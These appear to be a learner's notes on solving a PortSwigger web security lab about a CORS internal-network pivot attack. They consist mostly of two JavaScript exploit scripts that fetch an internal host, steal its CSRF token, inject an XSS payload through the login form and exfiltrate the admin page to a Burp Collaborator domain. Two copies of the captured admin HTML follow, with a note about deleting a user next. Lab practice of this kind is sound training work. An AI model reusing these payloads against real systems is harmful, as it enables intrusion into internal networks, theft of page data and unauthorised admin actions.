dont know whats wrong with this code
<script>
    url_BurpCollab = 'http://334b3p5n3c59tuw0zml126ab62cu0j.oastify.com';

    url = 'http://192.168.0.86:8080';

    fetch(url)
    .then(response => response.text())
    .then(text =>{
        try {
            xss_vector = '"><img src=/admin onload="new Image().src=\''+url_BurpCollab+'?code='+encodeURIComponent(this.contentWindow.document.body.innerHTML)+'\'">';
            login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/);
            location = url+login_path;
        } catch (err) {

        }
    })
</script>

code example:
<script>
    collaboratorURL = 'http://334b3p5n3c59tuw0zml126ab62cu0j.oastify.com';
    url = 'http://192.168.0.86:8080';
    function xss(url, text, vector) {
        location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
    }
    
    function fetchUrl(url, collaboratorURL){
        fetch(url).then(r=>r.text().then(text=>
        {
            xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
        }
        ))
    }
    
    fetchUrl(url, collaboratorURL);
</script>

=> success


code:
  <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
    <section class="academyLabBanner">
        <div class="container">
            <div class="logo"></div>
                <div class="title-container">
                    <h2>CORS vulnerability with internal network pivot attack</h2>
                    <a id="exploit-link" class="button" target="_blank" href="http://exploit-0afa005d046a4374c1ce570801b1009e.exploit-server.net">Go to exploit server</a>
                    <a class="link-back" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
                            <g>
                                <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
                                <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class="widgetcontainer-lab-status is-notsolved">
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class="lab-status-icon"></span>
                </div>
            </div>
        </section></div>
    

        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                        <input required="" type="hidden" name="csrf" value="k8L8vfEjPtQW34Rl63NYEbBMnMPhKZio">
                        <label>Username</label>
                        <input required="" type="text" name="username">
                        <button class="button" type="submit">Delete user</button>
                    </form>
                </div>
            </section>
        </div>
    



code:

<script src="/resources/labheader/js/labHeader.js"></script>
<div id="academyLabHeader">
<section class="academyLabBanner">
<div class="container">
<div class="logo"></div>
    <div class="title-container">
        <h2>CORS vulnerability with internal network pivot attack</h2>
        <a id="exploit-link" class="button" target="_blank" href="http://exploit-0afa005d046a4374c1ce570801b1009e.exploit-server.net">Go to exploit server</a>
        <a class="link-back" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">
            Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
            <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
                <g>
                    <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
                    <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
                </g>
            </svg>
        </a>
    </div>
    <div class="widgetcontainer-lab-status is-notsolved">
        <span>LAB</span>
        <p>Not solved</p>
        <span class="lab-status-icon"></span>
    </div>
</div>
</section></div>


<div theme="">
<section class="maincontainer">
    <div class="container is-page">
        <header class="navigation-header">
            <section class="top-links">
                <a href="/">Home</a><p>|</p>
                <a href="/admin">Admin panel</a><p>|</p>
                <a href="/my-account?id=administrator">My account</a><p>|</p>
            </section>
        </header>
        <header class="notification-header">
        </header>
        <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
            <input required="" type="hidden" name="csrf" value="k8L8vfEjPtQW34Rl63NYEbBMnMPhKZio">
            <label>Username</label>
            <input required="" type="text" name="username">
            <button class="button" type="submit">Delete user</button>
        </form>
    </div>
</section>
</div>


=> we in admin panel => tru to delete carlos in form post submit => next step : 4

